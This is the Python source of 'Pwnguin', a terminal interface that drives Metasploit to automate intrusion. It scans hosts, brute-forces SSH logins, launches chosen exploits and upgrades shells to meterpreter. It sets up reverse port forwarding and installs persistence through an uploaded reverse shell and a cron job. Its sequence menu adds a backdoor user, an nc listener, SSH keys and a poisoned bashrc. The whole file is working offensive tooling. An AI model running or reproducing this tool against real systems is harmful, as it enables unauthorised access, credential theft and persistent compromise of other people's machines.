import re
import subprocess
from time import sleep
from pathlib import Path
import ipaddress
import random as rng
from tkinter.filedialog import askopenfilename
import autopwn
import sequences
import getSSH
import post.postexploit as postexploit
import computer
from computer import Computer
from pymetasploit3.msfrpc import (
    MsfRpcClient,
    ExploitModule,
    PayloadModule,
    ShellSession,
)

from textual.app import App, ComposeResult
from textual.widgets import (
    Header,
    Footer,
    Static,
    Input,
    Label,
    ListItem,
    ListView,
    Tree,
    TabbedContent,
    TabPane,
    OptionList,
    Pretty,
    Button,
    Log,
    Collapsible,
    TextArea,
    Markdown,
    RadioSet,
    RadioButton,
)
from textual.widgets.tree import TreeNode
from textual import work, on, log
from textual.color import Color
from textual.containers import Container, Horizontal, ScrollableContainer
from textual.worker import get_current_worker
from rich.style import Style
from rich.text import Text

STATE = {
    "client": None,  # MsfRpcClient
    "action": None,  # 0 for computer scan, 1 for network scan
    "IP": None,
    "exploits": None,
    "exploit": None,  # index of the chosen exploit
    "exploit_ms": None,  # Metasploit exploit object
    "payloads": None,
    "payload": None,  # index of the chosen payload
    "payload_ms": None,  # Metasploit payload object
    "sessions": {},  # dict of shell sessions
    "computers": {},
    "ctrlservport": 0,
    "ctrlservproc": None,
}

RANK_COLORS = {
    "excellent": "red",
    "great": "orange",
    "good": "yellow",
    "normal": "green",
    "average": "blue",
    "low": "grey",
    "manual": "white",
}

default_exploits = [
    [
        "exploit/osx/local/setuid_tunnelblick",
        "excellent",
        "Here are the exploits of the vulns",
    ],
    [
        "exploit/multi/http/sflog_upload_exec",
        "normal",
        "Some exploits are better than others",
    ],
]

default_payloads = [
    "And finally the payloads available for the choosen exploit",
]


class Tile1(Static):

    def compose(self) -> ComposeResult:
        yield OptionList("Scan computer", "Scan network", "Bruteforce SSH", "Add route")

    def on_mount(self) -> None:
        self.border_title = "Action Type"

    @on(OptionList.OptionHighlighted)
    def show_selected(self, event: OptionList.OptionHighlighted) -> None:
        input = self.parent.query_one("#command", Input)
        if event.option_index == 0:
            input.placeholder = "Enter computer IP with mask (default: 127.0.0.1/8) (nmap must be installed on used machine)"
        elif event.option_index == 1:
            input.placeholder = "Enter network with mask (default: 192.168.1.0/24) (nmap must be installed on used machine)"
        elif event.option_index == 2:
            input.placeholder = "Enter the target IP with mask to bruteforce ssh creds (default: 127.0.0.1/8) (only local)"
        elif event.option_index == 3:
            input.placeholder = "[Network] via [IP] (ex: 10.0.2.0/24 via 192.168.155.244) (necessary to chain attacks)"
        STATE["action"] = event.option_index

    @on(OptionList.OptionSelected)
    def give_focus(self, event: OptionList.OptionSelected) -> None:
        input = self.parent.query_one("#command", Input)
        input.focus()


class Tile2(Static):

    def compose(self) -> ComposeResult:
        yield Input(placeholder="command here", id="command")

    def on_mount(self) -> None:
        self.border_title = (
            "Input (select machine used to scan on tree, nothing for local)"
        )

    @on(Input.Submitted)
    def scan(self) -> None:
        input = self.query_one(Input)
        command = input.value
        input.value = ""
        if STATE["action"] == 0:
            if not command:
                command = "127.0.0.1/8"
            if not re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$").match(
                command
            ):
                return
            self.perform_computer_scan(command)
        elif STATE["action"] == 1:
            if not command:
                command = "192.168.1.0/24"
            if not re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$").match(
                command
            ):
                return
            # assure that the IP is a network ip
            command = str(ipaddress.ip_network(command, strict=False))
            self.perform_network_scan(command)
        elif STATE["action"] == 2:
            if not command:
                command = "127.0.0.1/8"
            if not re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$").match(
                command
            ):
                return
            self.perform_bruteforce_ssh(command)
        elif STATE["action"] == 3:
            if not re.compile(
                r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2} via (?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
            ).match(command):
                return
            self.add_route(command.split(" ")[0], command.split(" ")[2])
        input.placeholder = "let's go !"
        pretty = self.parent.query_one("#logs", Pretty)
        pretty.update("Scanning " + command)

    @work(exclusive=True, thread=True)
    def perform_computer_scan(self, ip: str) -> None:
        try:
            scan_from = STATE["IP"]
            computer = STATE["computers"].get(scan_from)
            if computer and not computer.is_local:
                # scan on remote machine
                shellid = autopwn.findShellID(STATE["client"], scan_from.split("/")[0])
                if shellid:
                    shell = autopwn.getShell(STATE["client"], shellid)
                    result = autopwn.scanIp4Vulnerabilities(
                        ip=ip.split("/")[0], shell=shell
                    )
                else:
                    self.app.call_from_thread(
                        self.parent.query_one("#logs", Pretty).update,
                        "Can't launch scan from this remote machine",
                    )
                    return
            else:
                result = autopwn.scanIp4Vulnerabilities(ip=ip.split("/")[0])
        except:
            self.app.call_from_thread(
                self.parent.query_one("#logs", Pretty).update, "The host doesn't exist"
            )
            return

        if ip not in STATE["computers"]:
            STATE["computers"][ip] = Computer()
            self.app.call_from_thread(self.parent.query_one(Tile4).rebuild_tree)

        autopwn.getEdbExploit(result, get_all=True)
        self.app.call_from_thread(self.parent.query_one("#logs", Pretty).update, result)

        (edbExploits, _, _) = autopwn.createExploitList(result)

        STATE["computers"][ip].vulnerabilities = edbExploits
        vulnChoice = self.parent.query_one(VulnChoice)
        self.app.call_from_thread(vulnChoice.build_vuln_list, edbExploits)
        tab = self.app.query_one(Tile5)
        self.app.call_from_thread(tab.set_active_tab, "vuln_tab")
        self.app.call_from_thread(vulnChoice.query_one(OptionList).focus)

    @work(exclusive=True, thread=True)
    def perform_network_scan(self, ip: str) -> None:
        scan_from = STATE["IP"]
        computer = STATE["computers"].get(scan_from)
        if computer and not computer.is_local:
            # scan on remote machine
            shellid = autopwn.findShellID(STATE["client"], scan_from.split("/")[0])
            if shellid:
                shell = autopwn.getShell(STATE["client"], shellid)
                result = postexploit.scanNetwork(ip, shell=shell)
            else:
                self.app.call_from_thread(
                    self.parent.query_one("#logs", Pretty).update,
                    "Can't launch scan from this remote machine",
                )
                return
        else:
            result = postexploit.scanNetwork(ip)
        self.app.call_from_thread(self.parent.query_one("#logs", Pretty).update, result)
        mask = ip.split("/")[1]
        for ip in result:
            full_ip = ip + "/" + mask
            if full_ip not in STATE["computers"]:
                STATE["computers"][full_ip] = Computer()
        self.app.call_from_thread(self.parent.query_one(Tile4).rebuild_tree)

    @work(exclusive=True, thread=True)
    def perform_bruteforce_ssh(self, ip: str) -> None:
        if ip not in STATE["computers"]:
            STATE["computers"][ip] = Computer()
            self.app.call_from_thread(self.parent.query_one(Tile4).rebuild_tree)
        usrlist = askopenfilename(title="Please chose a user list")
        passlist = askopenfilename(title="Please chose a password list")
        if usrlist == () or passlist == ():
            usr, pwd = getSSH.getSshCredsAndConn(ip.split("/")[0])
        else:
            usr, pwd = getSSH.getSshCredsAndConn(
                ip.split("/")[0], str(usrlist), str(passlist)
            )
        if not usr:
            self.app.call_from_thread(
                self.parent.query_one("#logs", Pretty).update,
                "No credentials found for the target",
            )
            return
        else:
            STATE["computers"][ip].credentials.append({"usr": usr, "pwd": pwd})
        client: MsfRpcClient = STATE["client"]
        exploit = client.modules.use("auxiliary", "scanner/ssh/ssh_login")
        exploit["USERNAME"] = usr
        exploit["PASSWORD"] = pwd
        exploit["RHOSTS"] = ip.split("/")[0]
        STATE["exploit_ms"] = exploit
        STATE["payload_ms"] = None
        self.app.call_from_thread(
            self.parent.query_one("#logs", Pretty).update,
            f"creds found: {usr}:{pwd} - launching attack",
        )
        self.app.call_from_thread(
            self.app.query_one(ParamMenu).launch_attack, STATE["IP"], True
        )

    @work(exclusive=True, thread=True)
    def add_route(self, network: str, ip: str) -> None:
        client: MsfRpcClient = STATE["client"]
        autoroute = client.modules.use("post", "multi/manage/autoroute")
        shell_id = autopwn.findShellID(client, ip)
        autoroute["SESSION"] = int(shell_id)
        autoroute["SUBNET"] = network
        job = autoroute.execute()
        while len(client.jobs.list) != 0:
            sleep(0.1)
        self.app.call_from_thread(
            self.parent.query_one("#logs", Pretty).update,
            f"Added autoroute for {network} via {ip}",
        )


class Tile3(Static):

    def compose(self) -> ComposeResult:
        yield Pretty("Nothing for now", id="logs")

    def on_mount(self) -> None:
        self.border_title = "What is happening ?"


class Tile4(Static):

    tree: Tree = None
    connected: TreeNode = None

    def compose(self) -> ComposeResult:
        tree: Tree[dict] = Tree("all/")
        self.tree = tree
        tree.root.expand()
        yield tree

    def on_mount(self) -> None:
        self.border_title = "Computers found"

    def rebuild_tree(self):
        networks = computer.computers_to_network(STATE["computers"])
        self.tree.clear()
        for network in networks:
            network_node = self.tree.root.add(network, expand=True)
            for host in networks[network]:
                ip = host + "/" + network.split("/")[1]
                if ip not in STATE["computers"]:
                    STATE["computers"][ip] = Computer()
                network_node.add_leaf(host)

    @on(Tree.NodeSelected)
    def on_tree_selected(self, event: Tree.NodeSelected) -> None:
        node = event.node
        # check if network or computer
        if "/" in str(node.label):
            return
        if self.connected == node:
            # disconnect/return to localhost
            ip = None
            self.connected.set_label(str(self.connected.label)[1:])
            self.connected = None
        elif self.connected != None:
            # connect from previous to next
            ip = str(node.label) + "/" + str(node.parent.label).split("/")[1]
            self.connected.set_label(str(self.connected.label)[1:])
            node.set_label("*" + str(node.label))
            self.connected = node
        else:
            # connect from local to remote
            ip = str(node.label) + "/" + str(node.parent.label).split("/")[1]
            node.set_label("*" + str(node.label))
            self.connected = node
        self.app.query_one(ComputerInfos).scan(ip)
        if ip:
            self.app.query_one(VulnChoice).build_vuln_list(
                STATE["computers"][ip].vulnerabilities
            )
        STATE["IP"] = ip


class ComputerInfos(Static):

    mark: Markdown = None

    def compose(self) -> ComposeResult:
        self.mark = Markdown("")
        with ScrollableContainer():
            yield self.mark

    def on_mount(self) -> None:
        self.scan()

    @work(exclusive=True, thread=True)
    def scan(self, IP: str | None = None):
        shell_id = None
        computer: Computer = STATE["computers"].get(IP, Computer())
        if not IP or computer.is_local:
            # infos machine locale
            computer.os = postexploit.getOS()
            computer.networks = []
            for inter in postexploit.getTargetConnections():
                computer.add_network(inter[0], inter[1])
            computer.arp = []
            for entry in postexploit.getKnownARP():
                computer.add_arp_entry(entry["ip"], entry["mac"], entry["iface"])
        else:
            ip_no_mask = IP.split("/")[0]
            # récupérer la session de la machine distante si elle existe
            shell_id = (
                autopwn.findShellID(STATE["client"], ip_no_mask)
                if STATE["client"]
                else None
            )
            if shell_id:
                # update the results from the save
                shell = autopwn.getShell(STATE["client"], shell_id)
                computer.os = postexploit.getOS(shell=shell)
                computer.networks = []
                for inter in postexploit.getTargetConnections(shell=shell):
                    computer.add_network(inter[0], inter[1])
                computer.arp = []
                for entry in postexploit.getKnownARP(shell=shell):
                    computer.add_arp_entry(entry["ip"], entry["mac"], entry["iface"])
        s = ""
        if shell_id:
            s += "connected: yes\n"
        elif IP and not STATE["computers"].get(IP, Computer()).is_local:
            s += "connected: no - backup infos\n"
        s += "##### Machine distribution\n"
        s += computer.os
        s += "\n\n##### User/Passwords"
        for cred in computer.credentials:
            s += f"\n - {cred['usr']}:{cred['pwd']}"
        s += "\n\n##### Interfaces"
        for inter in computer.networks:
            s += f"\n - {inter['iface']}: {inter['network']}"
        s += "\n\n"
        s += "##### ARP Table\n"
        s += "|IP|MAC|Interface|\n|-|-|-|\n"
        for a in computer.arp:
            s += f"|{a['IP']}|{a['MAC']}|{a['iface']}|\n"
        self.app.call_from_thread(self.mark.update, s)


class VulnChoice(Static):
    vulnerabilities = [
        "Here are the vulns after being found",
    ]

    def compose(self) -> ComposeResult:
        with Container():
            yield OptionList(*(self.vulnerabilities), id="vuln_list")

    def build_vuln_list(self, vulnerabilities):
        self.vulnerabilities = vulnerabilities
        titles = [pwn["Title"] for pwn in vulnerabilities]
        vuln_list = self.query_one(OptionList)
        vuln_list.clear_options()
        vuln_list.add_options(titles)

    @on(OptionList.OptionSelected)
    def select_vuln(self, event: OptionList.OptionSelected) -> None:
        vuln = self.vulnerabilities[event.option_index]
        if "Metasploit" in vuln["Title"]:
            modules = autopwn.searchModules(STATE["client"], vuln["Title"][:-12])
            STATE["exploits"] = modules

            exploitsList = self.app.query_one("#exploit_list", OptionList)
            exploitsList = exploitsList.clear_options()
            exploits = [
                Text(exploit["fullname"], style=RANK_COLORS[exploit["rank"]])
                for exploit in modules
            ]
            exploitsList.add_options(exploits)
            self.app.query_one(TabbedContent).active = "exploit_tab"
            exploitsList.focus()
        else:
            file_path = autopwn.convert_path(vuln["Path"])
            TEXT = Path(file_path).read_text()
            textArea = self.app.query_one(TextArea)
            textArea.clear()
            textArea.insert(TEXT)
            textArea.cursor_location = (0, 0)
            self.app.query_one(TabbedContent).active = "file_tab"


class ExploitMenu(Static):
    def compose(self) -> ComposeResult:
        options = [
            Text(exploit[2], Style(color=Color.parse(RANK_COLORS[exploit[1]]).hex))
            for exploit in default_exploits
        ]
        with Container():
            with Horizontal(classes="horizontal"):
                yield Label("Rankings:")
                for rank, color in RANK_COLORS.items():
                    yield Label(rank, classes=color)
            yield OptionList(*options, id="exploit_list")

    @on(OptionList.OptionSelected)
    def select_exploit(self, event: OptionList.OptionSelected) -> None:
        STATE["exploit"] = event.option_index
        exploit = STATE["exploits"][event.option_index]
        exploit_ms, compatible_payloads = autopwn.selectExploitMS(
            STATE["client"], exploit["fullname"]
        )
        STATE["exploit_ms"] = exploit_ms
        STATE["payloads"] = compatible_payloads
        payloadsList = self.app.query_one("#payload_list", OptionList)
        payloadsList.clear_options()
        payloadsList.add_options([Text(payload) for payload in compatible_payloads])
        self.app.query_one(TabbedContent).active = "payload_tab"
        payloadsList.focus()


class PayloadMenu(Static):
    def compose(self) -> ComposeResult:
        with Container():
            yield OptionList(*default_payloads, id="payload_list")

    @on(OptionList.OptionSelected)
    def select_payload(self, event: OptionList.OptionSelected) -> None:
        STATE["payload"] = event.option_index
        payload = STATE["payloads"][event.option_index]
        STATE["payload_ms"] = autopwn.selectPayloadMS(STATE["client"], payload)
        self.app.query_one(ParamMenu).create()
        self.app.query_one(TabbedContent).active = "param_tab"


class ParamMenu(Static):
    def compose(self) -> ComposeResult:
        with Container(id="params_container"):
            yield ListView(
                ListItem(Container(Label("Param 1"), Input(placeholder="value 1"))),
                ListItem(Container(Label("Param 2"), Input(placeholder="value 2"))),
                id="params_list",
            )
            yield Button.success("Attack !")
            yield Static(
                "Warning: the attack is launch from the interface selected on the left"
            )

    @on(ListView.Selected)
    def select(self, event: ListView.Selected) -> None:
        event.item.query_one(Input).focus()

    @on(Input.Submitted)
    def submit(self, event: Input.Submitted) -> None:
        self.query_one(ListView).focus()

    @on(Button.Pressed)
    def pre_launch_attack(self, event: Button.Pressed) -> None:
        if not STATE["IP"]:
            self.app.query_one("#logs", Pretty).update(
                "You need to select an interface from where you want to start the attack !"
            )
            return
        for list_item in self.query_one(ListView).children:
            param_name = str(list_item.query_one(Label).renderable)
            param_value = list_item.query_one(Input).value
            if param_name in STATE["exploit_ms"].options:
                STATE["exploit_ms"][param_name] = param_value
            else:
                STATE["payload_ms"][param_name] = param_value
        self.app.query_one("#logs", Pretty).update("Okayy let's goo !")
        self.launch_attack(STATE["IP"], True)

    @work(exclusive=True, thread=True)
    # TODO add autoroute
    def launch_attack(self, ip_source_attack: str, persistence: bool) -> None:
        client: MsfRpcClient = STATE["client"]
        exploit = STATE["exploit_ms"]
        payload = STATE["payload_ms"]
        job = exploit.execute(payload=payload)
        while len(client.jobs.list) != 0:
            sleep(0.1)
        new_sessions = client.sessions.list
        new_sess = [
            element for element in new_sessions if element not in STATE["sessions"]
        ]
        if len(new_sess) == 0:
            self.app.call_from_thread(
                self.app.query_one("#logs", Pretty).update,
                "No session created, attack failed",
            )
            return
        new_sess_id = new_sess[0]

        # upgrading session to meterpreter
        if new_sessions[new_sess_id]["type"] == "shell":
            self.app.call_from_thread(
                self.app.query_one("#logs", Pretty).update,
                str(new_sessions) + " Upgrading shell to meterpreter...",
            )
            upgrade = client.modules.use("post", "multi/manage/shell_to_meterpreter")
            upgrade["SESSION"] = int(new_sess_id)
            upgrade["LHOST"] = ip_source_attack.split("/")[0]
            job = upgrade.execute()
            while len(client.jobs.list) != 0:
                sleep(0.1)
            client.sessions.session(new_sess_id).stop()
            sleep(1)
            new_sessions = client.sessions.list

        # port forwarding
        # rerun because shell upgrade generate new shell
        new_sess_id = [
            element for element in new_sessions if element not in STATE["sessions"]
        ][0]
        shell = client.sessions.session(new_sess_id)
        shell.write(
            f"portfwd add -R -l {STATE['ctrlservport']} -L {ip_source_attack.split('/')[0]} -p {STATE['ctrlservport']}"
        )
        sleep(2)

        # persistence
        if persistence:
            persistence_port = rng.randint(5000, 65535)
            self.app.call_from_thread(
                self.app.query_one("#logs", Pretty).update,
                f"Setting up persistence on the machine via cron job on port {persistence_port}...",
            )
            subprocess.run(
                f"./post/shellgen.sh {ip_source_attack.split('/')[0]} {persistence_port} elf",
                shell=True,
            )
            sleep(1)
            shell.write("upload ./post/vir/revshell /tmp/revshell")
            sleep(2)
            shell.write("shell")
            sleep(1)
            shell.write("chmod +x /tmp/revshell")
            sleep(1)
            shell.write(
                "(crontab -l ; echo \"* * * * * pgrep -x 'revshell' || /tmp/revshell \")|crontab -"
            )
            sleep(1)
            shell.write(">")
            sleep(1)
            full_ip = computer.find_full_ip(
                new_sessions[new_sess_id]["tunnel_peer"].split(":")[0],
                STATE["computers"],
            )
            STATE["computers"][full_ip].set_infection(
                True, via=ip_source_attack, port=persistence_port
            )

        STATE["sessions"] = new_sessions
        self.app.call_from_thread(
            self.app.query_one(ShellMenu).update_shells, new_sessions
        )

    def param_item_widget(self, name: str, placeholder) -> ListItem:
        return ListItem(Container(Label(name), Input(placeholder=placeholder)))

    def create(self):
        params_list = self.query_one("#params_list", ListView)
        params_list.clear()
        exploit: ExploitModule = STATE["exploit_ms"]
        payload: PayloadModule = STATE["payload_ms"]
        for param in exploit.missing_required:
            params_list.append(
                self.param_item_widget(param, exploit.info["options"][param]["desc"])
            )
        for param in payload.missing_required:
            params_list.append(
                self.param_item_widget(param, payload.info["options"][param]["desc"])
            )
        params_list.focus()


class ShellMenu(Static):

    def compose(self) -> ComposeResult:
        with ScrollableContainer(id="shells_container"):
            yield ListView(id="shells_list")

    def on_mount(self) -> None:
        self.children[0].can_focus = False

    def get_shells_info(self) -> dict:
        """get the info from the shells"""
        shellsList = self.query_one(ListView)
        children = shellsList.children
        shells_info = {}
        for child in children:
            label_str = child.query_one(Collapsible).title
            id = label_str.split(" ")[1].split(",")[0]
            shells_info[id] = {
                "tunnel_local": label_str.split(", ")[1].split(" ")[0],
                "tunnel_peer": label_str.split("-> ")[1],
                "base_log": "\n".join(child.query_one(Log).lines),
            }
        return shells_info

    def update_shells(self, new_shells: dict) -> None:
        """Add and remove the shells comparing the old and new ones"""
        current_shells = self.get_shells_info()
        # Remove shells that do not exist anymore
        current_shells = {
            id: shell for id, shell in current_shells.items() if id in new_shells.keys()
        }
        # Add new shells
        for new_id, new_shell in new_shells.items():
            if new_id not in current_shells.keys():
                current_shells[new_id] = {
                    "tunnel_local": new_shell["tunnel_local"],
                    "tunnel_peer": new_shell["tunnel_peer"],
                    "base_log": "",
                }

        shellsList = self.query_one(ListView)
        self.workers.cancel_group(self, "shells")
        shells = []
        for id, shell in current_shells.items():
            # Only recreate the ones that are still in the new shells, remove the others
            if id in new_shells.keys():
                new_log = Log().write(shell["base_log"])
                new_collasible = Collapsible(
                    Input(placeholder="command"),
                    new_log,
                    title=f"Shell {id}, {shell['tunnel_local']} -> {shell['tunnel_peer']}",
                )
                self.read_shell_log(
                    STATE["client"].sessions.session(id),
                    new_collasible,
                    new_log,
                    self.parent.parent.parent,
                )
                shells += [ListItem(new_collasible)]

        shellsList.clear()
        shellsList.extend(shells)
        self.parent.parent.parent.active = "shell_tab"
        shellsList.focus()

    @on(ListView.Highlighted)
    def open_collapse(self, event: ListView.Highlighted) -> None:
        if event.item is None:
            return
        for listItem in self.query_one(ListView).children:
            listItem.query_one(Collapsible).collapsed = True
        event.item.query_one(Collapsible).collapsed = False
        event.item.query_one(Input).focus()

    @on(ListView.Selected)
    def select_collapse(self, event: ListView.Selected) -> None:
        event.item.query_one(Collapsible).collapsed = False
        event.item.query_one(Input).focus()

    @on(Input.Submitted)
    def exec(self, event: Input.Submitted) -> None:
        """Execute one command in the shell, read the output, show it in the log"""
        cmd = event.input.value
        event.input.value = ""
        collapsible: Collapsible = event.input.parent.parent
        label = collapsible.title
        log = collapsible.query_one(Log)
        log.write_line(f"$ {cmd}")
        id = label.split(" ")[1].split(",")[0]
        self.write_shell(id, cmd)

    @work(thread=True)
    def write_shell(self, id: str, cmd: str) -> None:
        client: MsfRpcClient = STATE["client"]
        shell: ShellSession = client.sessions.session(id)
        shell.write(cmd)

    @work(thread=True, group="shells")
    def read_shell_log(
        self,
        shell: ShellSession,
        collaspible: Collapsible,
        log: Log,
        tabbed: TabbedContent,
    ) -> None:
        worker = get_current_worker()
        while not worker.is_cancelled:
            if not collaspible.collapsed and tabbed.active == "shell_tab":
                s = shell.read()
                if s:
                    self.app.call_from_thread(log.write_line, s)
            sleep(0.1)


class SequencesMenu(Static):

    sequences = [
        "user to root (no passwd)",
        "add user 'pwnguin'(already root)",
        "add nc listener port 55555 @reboot cron",
        "add authorized ssh key for user",
        "transmit linpeas",
        "transfer main.zip ?",
        "bashrc pwnguined",
        "send revshell",
        "download precompiled nmap",
    ]

    def compose(self) -> ComposeResult:
        with RadioSet(id="sequences"):
            for seq in self.sequences:
                yield RadioButton(seq)
        yield Button("Launch !")

    @on(Button.Pressed)
    @work(exclusive=True, thread=True)
    def launch_sequence(self, event: Button.Pressed):
        idx = self.query_one(RadioSet).pressed_index
        if idx == -1:
            return
        ip = STATE["IP"]
        ip_no_mask = ip.split("/")[0]
        shell_id = autopwn.findShellID(STATE["client"], ip_no_mask)
        if not shell_id:
            self.app.call_from_thread(
                self.app.query_one("#logs", Pretty).update,
                "no shell available for this IP",
            )
            return
        shell = autopwn.getShell(STATE["client"], shell_id)
        srv = ip_no_mask
        shell.write("shell")
        sleep(1)
        autopwn.sendCommands(
            shell, sequences.getsequence(idx, srv + ":" + str(STATE["ctrlservport"]))
        )
        sleep(1)
        shell.write(">")
        sleep(1)


class Tile5(Static):
    def compose(self) -> ComposeResult:
        with TabbedContent():
            with TabPane("Infos", id="computer_tab"):
                yield ComputerInfos()
            with TabPane("Vulnerabilities", id="vuln_tab"):
                yield VulnChoice()
            with TabPane("Exploit Menu", id="exploit_tab"):
                yield ExploitMenu()
            with TabPane("Payload Menu", id="payload_tab"):
                yield PayloadMenu()
            with TabPane("Parameters", id="param_tab"):
                yield ParamMenu()
            with TabPane("Shells", id="shell_tab"):
                yield ShellMenu()
            with TabPane("Sequences", id="sequence_tab"):
                yield SequencesMenu()
            with TabPane("File", id="file_tab"):
                yield Label(
                    "This tab is opened when automatic exploitation is not possible",
                    id="file_label",
                )
                yield TextArea.code_editor("", language="python")

    def on_mount(self) -> None:
        self.border_title = "Exploitation"
        self.query_one("#file_label", Label).styles.padding = (0, 1, 1, 1)

    def set_active_tab(self, active: str) -> None:
        self.query_one(TabbedContent).active = active


class Pwnguin(App):
    BINDINGS = [
        ("ctrl+t", "toggle_dark", "Toggle dark mode"),
    ]
    CSS_PATH = "interface.tcss"

    def compose(self) -> ComposeResult:
        yield Header()
        with Container(classes="grid"):
            yield Tile1(classes="tile centered", id="tile1")
            yield Tile2(classes="tile centered", id="tile2")
            yield Tile3(classes="tile", id="tile3")
            yield Tile4(classes="tile", id="tile4")
            yield Tile5(classes="tile", id="tile5")
        yield Footer()

    def on_ready(self) -> None:
        self.sub_title = "starting msfconsole..."
        self.init_app()

    @work(exclusive=True, thread=True)
    def init_app(self):
        # load save
        loaded = computer.load()
        STATE["computers"] = loaded

        # add local interfaces
        for inter in postexploit.getTargetConnections():
            STATE["computers"][inter[1]] = STATE["computers"].get(
                inter[1], Computer(is_local=True)
            )
        self.app.call_from_thread(self.query_one(Tile4).rebuild_tree)

        # start metasploit
        client = autopwn.runMetasploit(reinit=True, show=False, wait=False)
        STATE["client"] = client

        # Open Control Server
        STATE["ctrlservproc"], STATE["ctrlservport"] = postexploit.openCtrlSrv(
            show=False
        )

        # reconnect from infected
        logs = self.query_one("#logs", Pretty)
        paramMenu = self.query_one(ParamMenu)
        actions = computer.actions_to_reconnect(loaded)
        exploit = client.modules.use("exploit", "multi/handler")
        payload = client.modules.use("payload", "linux/x86/meterpreter/reverse_tcp")
        STATE["exploit_ms"] = exploit
        STATE["payload_ms"] = payload
        autoroute = client.modules.use("post", "multi/manage/autoroute")
        for action in actions:
            action_l = action.split(" ")
            if action_l[0] == "reconnect":
                self.call_from_thread(logs.update, "reconnecting " + action_l[1])
                payload["LHOST"] = action_l[3].split("/")[0]
                payload["LPORT"] = action_l[6]
                task = self.call_from_thread(
                    paramMenu.launch_attack, action_l[3], False
                )
                while task.is_running:
                    sleep(0.1)
            else:
                self.call_from_thread(logs.update, "adding route to" + action_l[1])
                autoroute["SUBNET"] = action_l[1]
                print(action_l[3].split("/")[0])
                print(autopwn.findShellID(client, action_l[3].split("/")[0]))
                autoroute["SESSION"] = int(
                    autopwn.findShellID(client, action_l[3].split("/")[0])
                )
                job = autoroute.execute()
                sleep(2)

        self.app.call_from_thread(self.end_init)

    def end_init(self):
        self.sub_title = "ready for pwn"


if __name__ == "__main__":
    app = Pwnguin()
    app.run()
    computer.save(STATE["computers"])
    subprocess.run("kill $(ps aux | grep 'msfrpcd' | awk '{print $2}')", shell=True)
    STATE["ctrlservproc"].kill()
# TODO add nmap scan on remote machine
